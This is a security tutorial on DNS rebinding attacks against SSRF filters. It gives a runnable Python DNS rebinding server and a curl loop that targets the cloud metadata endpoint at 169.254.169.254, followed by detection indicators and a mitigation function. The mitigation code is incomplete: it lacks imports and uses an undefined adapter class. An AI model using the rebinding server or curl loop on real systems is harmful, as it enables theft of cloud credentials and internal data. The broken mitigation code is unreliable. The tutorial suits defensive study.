# Detecting and Exploiting SSRF via DNS Rebinding Race Conditions

When testing SSRF filters that resolve DNS *before* making the request, DNS rebinding can bypass allowlist checks. The server resolves your domain to a safe IP first, then on the actual connection, the cached entry is swapped to an internal IP.

## How It Works

1. Victim app checks: "Is this IP allowed?" → DNS resolves to `1.2.3.4` (safe) ✓
2. App makes the actual HTTP request → DNS now resolves to `169.254.169.254` (metadata endpoint)

## Quick Rebinding Server with Python

```python
from dnslib import DNSRecord, RR, A
from dnslib.server import DNSServer, BaseResolver
import threading, time

class RebindResolver(BaseResolver):
    """Alternates between safe IP and target internal IP."""
    def __init__(self, safe_ip: str, target_ip: str):
        self.ips = [safe_ip, target_ip]
        self.counter = 0
        self.lock = threading.Lock()

    def resolve(self, request, handler):
        with self.lock:
            ip = self.ips[self.counter % 2]
            self.counter += 1
        reply = request.reply()
        qname = request.q.qname
        reply.add_answer(RR(qname, rdata=A(ip), ttl=0))  # TTL=0 is critical
        return reply

resolver = RebindResolver("1.2.3.4", "169.254.169.254")
server = DNSServer(resolver, port=53, address="0.0.0.0")
server.start_thread()
print("[*] DNS rebinding server running — TTL=0 forces re-resolution")
```

## Detection: Checking If a Target Is Vulnerable

```bash
# Use rebind.it or your own NS — fire multiple requests and check for inconsistency
for i in $(seq 1 20); do
  curl -s "https://vulnerable-app.com/fetch?url=http://7f000001.01020304.rbndr.us/latest/meta-data/" &
done
wait
# If any response contains AWS metadata, the SSRF filter is bypassable
```

## Key Indicators for Defense

- **TTL=0 in DNS responses** — legitimate services rarely use zero TTL
- **Multiple resolutions for the same domain within one request lifecycle**
- Pin the resolved IP: resolve once, then connect to that exact IP (don't re-resolve)

## Mitigation (for builders)

```python
import socket
import ipaddress

def safe_fetch(url: str):
    """Resolve first, validate, then force connection to that IP."""
    hostname = urllib.parse.urlparse(url).hostname
    ip = socket.gethostbyname(hostname)
    
    # Block RFC1918, link-local, metadata ranges
    addr = ipaddress.ip_address(ip)
    if addr.is_private or addr.is_link_local or addr.is_loopback:
        raise ValueError(f"Blocked internal IP: {ip}")
    
    # Force requests to use the pre-resolved IP (no re-resolution)
    session = requests.Session()
    session.mount("http://", ForcedIPAdapter(ip))
    return session.get(url, timeout=5)
```

The TTL=0 trick is the cornerstone — without it, cached DNS won't flip in time.
